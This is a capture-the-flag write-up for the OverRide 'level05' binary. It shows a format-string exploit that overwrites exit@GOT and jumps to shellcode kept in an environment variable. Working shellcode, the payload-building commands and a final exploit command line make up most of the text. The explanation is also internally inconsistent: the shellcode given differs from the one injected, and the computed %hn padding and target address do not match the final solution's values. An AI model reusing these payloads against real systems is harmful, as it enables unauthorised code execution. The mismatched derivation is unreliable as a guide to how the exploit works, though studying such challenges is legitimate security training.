Level05
-------

1) 
After checking the main() function: we found that the program convert characters from uppercase to lowercase and print the buffer with printf()

   0x08048507 <+195>:	call   0x8048340 <printf@plt>

printf() is not protected 

Our input is treated as a format string

So you can use:

%x → read memory
%n → write memory

2) Let's find the index of the bufer in the stack:


level05@OverRide:~$ ./level05 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 f7ec3af9 fffed6cf fffed6ce 0 ffffffff fffed754 f7fdb000 61616161 20782520 25207825


61616161 = "aaaa" it's our input because the program converts "AAAA" to "aaaa"

So the offset is 10 

3) Let's control execution

Means : when the program runs exit(0); we overwrite exit@GOT → our address

Instead of using stack (unstable) we use environment variable because :
It’s stored at high memory (0xffffxxxx)
It’s stable between runs
It can hold large data (NOP sled)

4) Let's inject our shellcode :

execve("/bin/sh", NULL, NULL); 
            =
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80 

we inject the command :

export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')


NOP = No Operation in assembly : \x90 
means : do nothing, go to next instruction

It's useful because memory might be:

0xffff0000 → NOP
0xffff0100 → NOP
0xffff0200 → NOP
0xffff0300 → shellcode
jump → NOP → NOP → NOP → shellcode → /bin/sh

5) The address to write

We choose: 0xffff0101

Split the address : 
low  = 0x0101 = 257
high = 0xffff = 65535

6) Let's get the address of exit()

level05@OverRide:~$ objdump -R ./level05

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main


Because it starts with 0xffff → environment zone
Ends with 0101 → inside NOP sled

7) How %hn works

%hn writes: number of printed characters

So we must control how many characters are printed

71) 
We want: 0x0101 = 257

Already printed: 8 bytes (2 addresses)

So we add: 257 - 8 = 249

so =>  %249x%10$hn

72) 
We want: 0xffff = 65535

Already at: 257

So we add: 65535 - 257 = 65278

so : %65278x%11$hn

8) 

python -c 'print(
"\xe0\x97\x04\x08" +   # exit@GOT
"\xe2\x97\x04\x08" +   # exit@GOT+2
"%249x%10$hn" +
"%65278x%11$hn"
)'

                ┌──────────────────────────────┐
                │            STACK             │
                ├──────────────────────────────┤
arg10  ───────► │ 0x080497e0 (exit@GOT)        │
arg11  ───────► │ 0x080497e2 (exit@GOT + 2)    │
                │ "%249x%10$hn%65278x%11$hn"   │
                └─────────────┬────────────────┘
                              │
                              ▼
                        printf(buffer)
                              │
                              ▼
                ┌──────────────────────────────┐
                │             GOT              │
                ├──────────────────────────────┤
BEFORE          │ 0x080497e0 → libc exit()     │
AFTER           │ 0x080497e0 → 0xffff0101      │
                └─────────────┬────────────────┘
                              │
                              ▼
                        exit() call
                              │
                              ▼
                ┌──────────────────────────────┐
                │        ENVIRONMENT           │
                ├──────────────────────────────┤
                │ 0xffff0000 → NOP             │
                │ 0xffff0100 → NOP  ◄── jump   │
                │ 0xffff0200 → NOP             │
                │    ...                       │
                │ 0xffffXXXX → shellcode       │
                │                ↓             │
                │            /bin/sh           │
                └──────────────────────────────┘

9) the solution 

(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56412c"+"%10$hn"+"%9115c"+"%11$hn"' ;cat -) | ./level05
